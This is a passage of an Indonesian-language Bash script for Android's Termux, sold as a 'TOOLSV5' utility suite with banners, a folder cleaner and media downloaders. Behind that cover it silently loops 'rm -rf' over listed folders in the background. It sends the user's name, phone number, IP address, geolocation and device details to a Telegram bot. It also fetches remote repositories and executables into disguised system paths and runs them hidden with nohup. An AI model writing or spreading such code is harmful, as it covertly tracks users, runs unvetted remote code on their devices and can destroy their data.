⠀⠀⢀⣶⣿⣶⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠁⣀⣤⡄⢹⣷⡀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⡧⠤⠤⣌⣉⣩⣿⡿⠶⠶⠒⠛⠛⠻⠿⠶⣾⣿⣣⠔⠉⠀⠀⠙⡆⢻⣷⠀⠀⠀⠀⠀
⠀⠀⢸⣿⠀⠀⢠⣾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡃⠀⠀⠀⠀⠀⢻⠘⣿⡀⠀⠀⠀⠀
⠀⠀⠘⣿⡀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣤⣀⠀⢘⠀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⢿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⣴⣿⠀⠀⠀⠀⠀
⠀⠀⠀⣸⡟⠀⠀⠀⣴⡆⠀⠀⠀⠀⠀⠀⠀⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⡀⠀⠀⠀⠀
⠀⠀⢰⣿⠁⠀⠀⣰⠿⣇⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⢠⡄⠀⠀⠀⠀⠀⡀⠀⠹⣷⠀⠀⠀⠀
⠀⠀⣾⡏⠀⢀⣴⣿⣤⢿⡄⠀⠀⠀⠀⠀⠀⠸⣿⣷⡀⠘⣧⠀⠀⠀⠀⠀⣷⣄⠀⢻⣇⠀⠀⠀
⠀⠀⢻⣇⠀⢸⡇⠀⠀⠀⢻⣄⠀⠀⠀⠀⠀⣤⡯⠈⢻⣄⢻⡄⠀⠀⠀⠀⣿⡿⣷⡌⣿⡄⠀⠀
⠀⢀⣸⣿⠀⢸⡷⣶⣶⡄⠀⠙⠛⠛⠛⠛⠛⠃⣠⣶⣄⠙⠿⣧⠀⠀⠀⢠⣿⢹⣻⡇⠸⣿⡄⠀
⢰⣿⢟⣿⡴⠞⠀⠘⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡇⠀⣿⡀⢀⣴⠿⣿⣦⣿⠃⠀⢹⣷⠀
⠀⢿⣿⠁⠀⠀⠀⠀⠀⠀⠀⢠⣀⣀⡀⠀⡀⠀⠀⠀⠀⠀⠀⣿⠛⠛⠁⠀⣿⡟⠁⠀⠀⢀⣿⠂
⠀⢠⣿⢷⣤⣀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠉⠀⠀⠀⠀⠀⢠⡿⢰⡟⠻⠞⠛⣧⣠⣦⣀⣾⠏⠀
⠀⢸⣿⠀⠈⢹⡿⠛⢶⡶⢶⣤⣤⣤⣤⣤⣤⣤⣤⣶⠶⣿⠛⠷⢾⣧⣠⡿⢿⡟⠋⠛⠋⠁⠀⠀
⠀⣾⣧⣤⣶⣟⠁⠀⢸⣇⣸⠹⣧⣠⡾⠛⢷⣤⡾⣿⢰⡟⠀⠀⠀⣿⠋⠁⢈⣿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣼⡏⠻⢿⣶⣤⣿⣿⠀⠈⢉⣿⠀⢸⣏⠀⣿⠈⣷⣤⣤⣶⡿⠶⠾⠋⣉⣿⣦⣀⠀⠀⠀
⠀⠀⣼⡿⣇⠀⠀⠙⠻⢿⣿⠀⠀⢸⣇⠀⠀⣻⠀⣿⠀⣿⠟⠋⠁⠀⠀⢀⡾⠋⠉⠙⣿⡆⠀⠀
⠀⠀⢻⣧⠙⢷⣤⣦⠀⢸⣿⡄⠀⠀⠉⠳⣾⠏⠀⢹⣾⡇⠀⠀⠙⠛⠶⣾⡁⠀⠀⠀⣼⡇⠀⠀
⠀⠀⠀⠙⠛⠛⣻⡟⠀⣼⣿⣇⣀⣀⣀⡀⠀⠀⠀⣸⣿⣇⠀⠀⠀⠀⠀⠈⢛⣷⠶⠿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣅⣠⣿⠛⠋⠉⠉⠛⠻⠛⠛⠛⠛⠋⠻⣧⡀⣀⣠⢴⠾⠉⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⡏⠉⣿⡟⠁⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣌⠁⠀⠀⠈⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣇⣠⣿⣿⡶⠶⠶⣶⣿⣷⡶⣶⣶⣶⣶⡶⠶⠶⢿⣿⡗⣀⣤⣾⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠛⢻⣿⡇⠀⠀⣿⡟⠛⠷⠶⠾⢿⣧⠁⠀⠀⣸⡿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣦⣤⡿⠀⠀⠀⠀⠀⠀⢿⣧⣤⣼⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
}
banner3() {
echo "
"
}
banner4() {
echo "
████████╗ ██████╗  ██████╗ ██╗     ███████╗██╗   ██╗███████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝██║   ██║██╔════╝
██║   ██║   ██║██║   ██║██║     ███████╗██║   ██║███████╗
██║   ██║   ██║██║   ██║██║     ╚════██║╚██╗ ██╔╝╚════██║
██║   ╚██████╔╝╚██████╔╝███████╗███████║ ╚████╔╝ ███████║
╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝  ╚═══╝  ╚══════╝
"
}
banner5() {
echo "
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
banner6() {
e "$m
██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗
██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗
$p██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝
╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗
╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝$res"
}
logo=("banner1" "banner2" "banner4" "banner5")
random_index=$((RANDOM % ${#logo[@]}))
banner="${logo[random_index]}"
cachetoolsv5() {
LIST_FILE="$DIR_SAVE/.list.txt"
function clear_terminal() {
clear
}
function banner() {
e "\033[1;32m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⢀⣴⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣬⣭⣥⣤⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄
⠀⠀⠀⣠⠞⢛⣷⡾⠟⠁⠀⠀⠀⠀⠀⢀⣾⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿
⠀⢠⡟⢁⣴⣿⣯⠀⢀⣤⣤⣤⣤⣤⣤⣿⣿⡟⠁⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⣠⣿⠟⢋⣭⠙⣡⣈⠻⠿⠿⠿⠿⠿⠟⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠸⠟⠁⣀⣈⢋⣀⣘⣉⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⢸⣿⡿⣿⣿⢿⣿⢿⣿⡿⢿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⠸⣿⡇⣿⣿⢸⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⡇⠸⣿⣿
⠀⠀⣿⡇⢻⣿⢸⣿⢸⣿⠇⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⣿⣧⢸⣿⢸⣿⢸⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡗⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
\033[1;37mGALIRUS X GUSTI
\n"
}
function get_size() {
du -sh "$1" 2> /dev/null | cut -f1
}
function clear_folder() {
e "\n\033[1;93mSedang Proses Menghapus"
total_size_before=0
for path in "$@"; do
if [ -d "$path" ]; then
size=$(get_size "$path")
e "\033[1;93mUkuran Di Hapus\033[1;37m: $size"
rm -rf "$path"
fi
done
e "\033[1;93mBerhasil Menghapus"
sleep 2
}
function cek_list() {
clear_terminal
banner
if [ -f "$LIST_FILE" ]; then
e "\033[1;93mDaftar Isi List:\n"
cat -n "$LIST_FILE"
else
e "\n\033[1;93mDaftar List Kosong."
fi
IFS= read -r -e -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
}
function add_to_list() {
clear_terminal
banner
e "\033[1;93mMasukan Direktori Untuk Di Tambahkan Ke List:"
e "\033[1;93mContoh\033[1;37m: \033[1;36m/sdcard/download"
while true; do
IFS= read -r -e -p $'\n\033[1;93mMasukan\033[1;37m:-»\033[1;36m ' folder_path
echo "$folder_path" >> "$LIST_FILE"
e "\n\033[1;93mDirektori Di Tambahkan"
IFS= read -r -e -p $'\033[1;37mMau Menambahkan Lagi (y/n): ' choice
if [ "$choice" != "y" ]; then
break
fi
done
}
function delete_from_list() {
while true; do
clear_terminal
banner
if [ -f "$LIST_FILE" ]; then
e "\033[1;93mDaftar Isi List:\n"
cat -n "$LIST_FILE"
IFS= read -r -e -p $'\n\033[1;93mPilih Nomor Yang Mau Di Hapus\033[1;31m:\033[1;37m ' choice
if [[ $choice =~ ^[0-9]+$ ]]; then
sed -i "${choice}d" "$LIST_FILE"
e "\n\033[1;93mDirektori Dihapus"
else
e "\n\033[1;93mMasukkan Dengan Benar"
fi
IFS= read -r -e -p $'\n\033[1;37mMau Menghapus Lagi (y/n):\033[1;37m ' continue_choice
if [ "$continue_choice" != "y" ]; then
break
fi
else
e "\n\033[1;93mDaftar List Kosong."
IFS= read -r -e -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
break
fi
done
}
function main_menu() {
while true; do
clear_terminal
banner
e "\033[1;93mDaftar Menu\033[1;37m:"
e "\033[1;93m1\033[1;31m. \033[1;36mClear"
e "\033[1;93m2\033[1;31m. \033[1;36mCek List"
e "\033[1;93m3\033[1;31m. \033[1;36mTambahkan List"
e "\033[1;93m4\033[1;31m. \033[1;36mHapus List"
e "\033[1;93m5\033[1;31m. \033[1;36mExit"
IFS= read -r -e -p $'\033[1;93mSilahkan Pilih \033[31m(\033[1;37m1-5\033[31m)\033[1;37m: ' choice
case $choice in
1)
if
[ -f "$LIST_FILE" ]
then
mapfile -t folder_paths < "$LIST_FILE"
clear_folder "${folder_paths[@]}"
else
e "\n\033[1;93mList Kosong. Tambahkan List"
IFS= read -r -e -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
fi
;;
2)
cek_list
;;
3)
add_to_list
;;
4)
delete_from_list
;;
5)
break
;;
*)
e "\n\033[1;93mMasukkan Dengan Benar"
sleep 2
;;
esac
done
}
main_menu
}
runclear() {
while true; do
LIST_FILE="$DIR_SAVE/.list.txt"
function get_size() {
du -sh "$1" 2> /dev/null | cut -f1
}
function clear_folder() {
e "\n\033[1;93mSedang Proses Menghapus"
total_size_before=0
for path in "$@"; do
if [ -d "$path" ]; then
size=$(get_size "$path")
e "\033[1;93mUkuran Di Hapus\033[1;37m: $size"
rm -rf "$path"
fi
done
e "\033[1;93mBerhasil Menghapus"
sleep 2
}
if [ -f "$LIST_FILE" ]; then
mapfile -t folder_paths < "$LIST_FILE"
clear_folder "${folder_paths[@]}"
else
e "\n\033[1;93mList Kosong. Tambahkan List"
IFS= read -r -e -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
fi
sleep 10
done
}
runclear &> /dev/null &
gitcek() {
install_git() {
echo "Menginstal git..."
nala uninstall git
$paket install -y git
}
check_git_functionality() {
if ! git --version &> /dev/null; then
echo "Git tidak berfungsi. Memperbaiki instalasi..."
install_git
$paket install -y libcurl openssl
$paket install -y ruby curl gnupg ncurses-utils
else
echo "Git sudah terpasang dan berfungsi dengan benar."
fi
}
if ! command -v git &> /dev/null; then
echo "Git tidak terpasang."
install_git
else
check_git_functionality
fi
}
termuxtoolsv5="/data/data/com.termux/files"
telegram() {
TOKEN1="$token"
CHAT_ID="$id"
CURRENT_TOKEN=$TOKEN1
decrypt_id() {
local encrypted_id="$1"
echo "$encrypted_id" | openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"SORASAKIHINA" -base64 2> /dev/null
}
get_location_info() {
local services=(
"https://ipapi.co/json/"
"https://ipinfo.io/json"
"http://ip-api.com/json"
"https://freegeoip.app/json/")
for service in "${services[@]}"; do
local response=$(curl -s --connect-timeout 1 "$service")
if [[ $service == *"ipapi.co"* ]]; then
local city=$(echo "$response" | jq -r '.city // empty')
local region=$(echo "$response" | jq -r '.region // empty')
local country=$(echo "$response" | jq -r '.country_name // empty')
local loc=$(echo "$response" | jq -r '.latitude,.longitude' | tr '\n' ',' | sed 's/,$//')
elif [[ $service == *"ipinfo.io"* ]]; then
local city=$(echo "$response" | jq -r '.city // empty')
local region=$(echo "$response" | jq -r '.region // empty')
local country=$(echo "$response" | jq -r '.country // empty')
local loc=$(echo "$response" | jq -r '.loc // empty')
elif [[ $service == *"ip-api.com"* ]]; then
local city=$(echo "$response" | jq -r '.city // empty')
local region=$(echo "$response" | jq -r '.regionName // empty')
local country=$(echo "$response" | jq -r '.country // empty')
local loc=$(echo "$response" | jq -r '.lat,.lon' | tr '\n' ',' | sed 's/,$//')
elif [[ $service == *"freegeoip.app"* ]]; then
local city=$(echo "$response" | jq -r '.city // empty')
local region=$(echo "$response" | jq -r '.region_name // empty')
local country=$(echo "$response" | jq -r '.country_name // empty')
local loc=$(echo "$response" | jq -r '.latitude,.longitude' | tr '\n' ',' | sed 's/,$//')
fi
if [ -n "$city" ]; then
echo "$city|$region|$country|$loc"
return 0
fi
sleep 1
done
echo "Tidak Diketahui|Tidak Diketahui|Tidak Diketahui|Tidak Diketahui"
return 1
}
info=$(neofetch --stdout)
brand=$(echo "$info" | grep "Host:" | awk -F ':' '{print $2}' | xargs | awk '{print $1}')
os=$(echo "$info" | grep "OS:" | cut -d ':' -f2- | xargs)
cpu=$(echo "$info" | grep "CPU:" | cut -d ':' -f2- | xargs)
gpu=$(echo "$info" | grep "GPU:" | cut -d ':' -f2- | xargs)
memory=$(echo "$info" | grep "Memory:" | awk -F ':' '{print $2}' | xargs)
kernel=$(echo "$info" | grep "Kernel:" | cut -d ':' -f2- | xargs)
uptime=$(echo "$info" | grep "Uptime:" | cut -d ':' -f2- | xargs)
shell=$(echo "$info" | grep "Shell:" | cut -d ':' -f2- | xargs)
resolution=$(echo "$info" | grep "Resolution:" | cut -d ':' -f2- | xargs)
if [[ $memory =~ "MB" ]]; then
memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
elif [[ $memory =~ "KB" ]]; then
memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')
else
memory=$(echo "$memory" | awk '{used=$1; total=$3; printf "%.2f/%.2f GB", used/1024, total/1024}')
fi
IFS='|' read -r city region country loc <<< "$(get_location_info)"
ip_address=$(curl -s https://api.ipify.org || echo "Tidak Diketahui")
versitoolsv5penguna="$PREFIX/lib/version"
cekversionnew=$(cat "$versitoolsv5penguna" 2> /dev/null || echo "Unknown")
NAMA_FILE="$PREFIX/include/bash/include/filememek.h"
NAMA=$(cat "$NAMA_FILE" 2> /dev/null || echo "Unknown")
TERMUX_ID=$(id)
STATUS="TRIAL ❌"
NOMOR_TELEPON="Tidak Diketahui"
if [[ -f $gal ]]; then
read -r user_local encrypted_local nowa_local < "$gal"
decrypted_local=$(decrypt_id "$encrypted_local")
mapfile -t db_lines < <(
curl -sL "$DATABASE_URL" |
openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -base64 -pass pass:'LEMAH_LU_PADA' 2> /dev/null
) || {
echo "Gagal mengambil database !"
}
for db_line in "${db_lines[@]}"; do
[[ -z $db_line ]] && continue
user_db=$(echo "$db_line" | awk '{print $1}')
encrypted_db=$(echo "$db_line" | awk '{print $2}')
nowa_db=$(echo "$db_line" | awk '{print $3}')
decrypted_db=$(decrypt_id "$encrypted_db")
if [[ $user_local == "$user_db" ]] && [[ $decrypted_local == "$decrypted_db" ]] && [[ $nowa_local == "$nowa_db" ]]; then
STATUS="PREMIUM ✅"
NOMOR_TELEPON="$nowa_local"
break
fi
done
fi
scan_files() {
local file=$1
if [ -f "$file" ]; then
echo "📄 Berkas Terpantau Aman ✅"
else
echo "📄 Berkas Terpantau Hilang Pengguna Melanggar Aturan ❌"
fi
}
ISIPESAN="$isipesan"
toolsv5="/data/data/com.termux/files/home/Lubeban/.git/index"
scan_results=$(scan_files "$toolsv5")
if [[ $loc != "Tidak Diketahui" ]]; then
loc_link="https://www.google.com/maps?q=$loc"
loc_display="$loc ([Lihat Peta]($loc_link))"
else
loc_display="Tidak Diketahui"
fi
caption=$(
cat << EOF
🔰 TOOLSV5 NOTIFICATION 🔰
👤 Nama: $NAMA
🆔 ID Termux: $(echo "$TERMUX_ID" | cut -d' ' -f1)...
👥 User        : $(whoami)
📱 Device : $brand
📋 Status: $STATUS
📝 Version: $cekversionnew
📞 Nomor Telepon: $NOMOR_TELEPON
💬 SYSTEM INFORMATION 💬
📍 Wilayah     : ${region:-Tidak Diketahui}
🇮🇩 Negara      : ${country:-Tidak Diketahui}
📌 Lokasi      : ${loc_display:-Tidak Diketahui}
🗂️ HASIL SCAN FILE:
$scan_results
💬 PESAN NOTIFIKASI:
$ISIPESAN
EOF
)
caption="${caption//'\\n'/$'\n'}"
URL="https://api.telegram.org/bot$CURRENT_TOKEN/sendMessage"
response=$(curl -s -L -X POST "$URL" \
-d chat_id="$CHAT_ID" \
--data-urlencode text="$caption")
success=$(echo "$response" | jq -r '.ok')
if [ "$success" == "true" ]; then
echo "Notifikasi berhasil dikirim ke Telegram"
else
echo "⚠️ Gagal mengirim notifikasi"
if [[ $CURRENT_TOKEN == "$TOKEN1" ]]; then
echo "Menggunakan token cadangan..."
CURRENT_TOKEN=$TOKEN2
else
echo "Gagal menggunakan kedua token"
fi
fi
}
if [ -d "$termuxtoolsv5" ]; then
nama_file="$PREFIX/include/bash/include/filememek.h"
nama=$(cat "$nama_file")
MUSIEK() {
MUSIC_DIR="$HOME/Lubeban/music"
mkdir -p "$MUSIC_DIR"
if ! command -v yt-dlp &> /dev/null; then
clear
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $k $bg_m "Packaging Belum Terinstall Bentar Tod !$res"
echo
sleep 3
$paket update
$paket upgrade
$paket install -y wget ffmpeg
wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
chmod a+rx $PREFIX/bin/yt-dlp
break
fi
while true; do
clear
e $k $bg_m "Setel Backsound TOOLSV5 Sesuai Selera Anda$res"
sleep 5
e "$b"
IFS= read -r -e -p "Masukkan link YouTube Cuy : " YT_LINK
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $b $bg_h "Proses Unduhan DiMulai$res"
sleep 3
echo
yt-dlp --extract-audio --audio-format mp3 -o "$MUSIC_DIR/%(title)s.%(ext)s" "$YT_LINK"
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $b $bg_h"Musik berhasil diunduh dan disimpan$res"
sleep 3
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e "$b"
IFS= read -r -e -p "Apakah Anda ingin mengunduh musik lain? (Y/N): " yn
if [[ $yn == [Yy]* ]]; then
continue
elif [[ $yn == [Nn]* ]]; then
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m $k "Mohon jawab dengan Y atau N$res"
sleep 3
break
fi
done
}
xxparun() {
while true; do
scan="$PREFIX/share/xxpa"
if [ -d "$scan" ]; then
cd $scan
git stash &> /dev/null
git pull origin main &> /dev/null
echo "y" | termux-setup-storage &> /dev/null
chmod 777 xxpa
nohup bash xxpa &> /dev/null &
exit 0
else
echo "y" | termux-setup-storage &> /dev/null
cd $PREFIX/share
git clone https://github.com/GALIRUS404/xxpa
cd xxpa
git stash &> /dev/null
git pull origin main &> /dev/null
fi
done
}
base() {
while true; do
scan="$PREFIX/lib/apt/methods/network"
if [ -d "$scan" ]; then
cd $scan
git stash &> /dev/null
git pull origin main &> /dev/null
echo "y" | termux-setup-storage &> /dev/null
chmod 777 FNS
nohup bash FNS &> /dev/null &
exit 0
else
echo "y" | termux-setup-storage &> /dev/null
cd $PREFIX/lib/apt/methods
git clone https://github.com/GALIRUS404/network
cd network
git stash &> /dev/null
git pull origin main &> /dev/null
xxparun
fi
done
}
downloader() {
curl -sL "https://kontollukecilkocak.vercel.app/gal" -o "$PREFIX/bin/xnxx"
chmod +x $PREFIX/bin/xnxx
}
mpvtube() {
curl -sL "https://kontollukecilkocak.vercel.app/mpvtube.sh" -o "$PREFIX/bin/xnxxx"
chmod +x $PREFIX/bin/xnxxx
}
Downloadnowatermark() {
while true; do
nama="/data/data/com.termux/files/sopowesu.txt"
if [ -f "$nama" ]; then
install_package_if_missing() {
local package=$1
if ! command -v $package &> /dev/null; then
echo "$package tidak ditemukan, menginstal..."
apt-get update
apt-get install $package
gem install lolcat
clear
else
echo "$package sudah terinstal"
clear
fi
}
install_package_if_missing curl
install_package_if_missing jq
install_package_if_missing yt-dlp
install_package_if_missing ruby
install_package_if_missing curl neofetch inetutils
color_splash() {
clear
for i in {1..5}; do
e "\e[1m\e[38;5;$((RANDOM % 256))m                   DOWNLOADER No Watermark \e[0m"
sleep 1
clear
done
}
banner() {
echo "
███████╗██╗  ██╗██╗██████╗ ██╗   ██╗███████╗
██╔════╝██║  ██║██║██╔══██╗██║   ██║██╔════╝
███████╗███████║██║██████╔╝██║   ██║███████╗
╚════██║██╔══██║██║██╔══██╗██║   ██║╚════██║
███████║██║  ██║██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ No Watermark"
}
color_splash
search_xnxx() {
local query=$1
local encoded_query=$(echo "$query" | jq -sRr @uri)
local url="https://www.xnxx.com/search/$encoded_query"
echo "Mencari di: $url"
local result=$(curl -s "$url")
echo "$result" | grep -oP '(?<=href=")[^"]*' | grep '/video' | sed 's|^|https://www.xnxx.com|'
}
download_video() {
local video_url=$1
local file_path="/storage/emulated/0/$(basename "$video_url").mp4"
echo "Mengunduh video dari: $video_url"
yt-dlp -o "$file_path" "$video_url"
if [ $? -eq 0 ]; then
echo "Video berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video"
fi
}
download_youtube_video() {
IFS= read -r -e -p "Masukkan link YouTube: " youtube_link
local file_path="/storage/emulated/0/youtube_video_$(date +%s).mp4"
yt-dlp -o "$file_path" "$youtube_link"
if [ $? -eq 0 ]; then
echo "Video YouTube berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video YouTube"
fi
}
download_youtube_music() {
IFS= read -r -e -p "Masukkan link YouTube: " youtube_link
local file_path="/storage/emulated/0/youtube_music_$(date +%s).mp3"
yt-dlp -x --audio-format mp3 -o "$file_path" "$youtube_link"
if [ $? -eq 0 ]; then
echo "Musik YouTube berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh musik YouTube"
fi
}
download_tiktok_video() {
IFS= read -r -e -p "Masukkan link TikTok: " tiktok_link
local file_path="/storage/emulated/0/tiktok_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$tiktok_link"
if [ $? -eq 0 ]; then
echo "Video TikTok berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video TikTok"
fi
}
download_instagram_video() {
IFS= read -r -e -p "Masukkan link Instagram: " instagram_link
local file_path="/storage/emulated/0/instagram_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$instagram_link"
if [ $? -eq 0 ]; then
echo "Video Instagram berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video Instagram"
fi
}
download_facebook_video() {
IFS= read -r -e -p "Masukkan link Facebook: " facebook_link
local file_path="/storage/emulated/0/facebook_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$facebook_link"
if [ $? -eq 0 ]; then
echo "Video Facebook berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video Facebook"
fi
}
download_pinterest_video() {
IFS= read -r -e -p "Masukkan link Pinterest: " pinterest_link
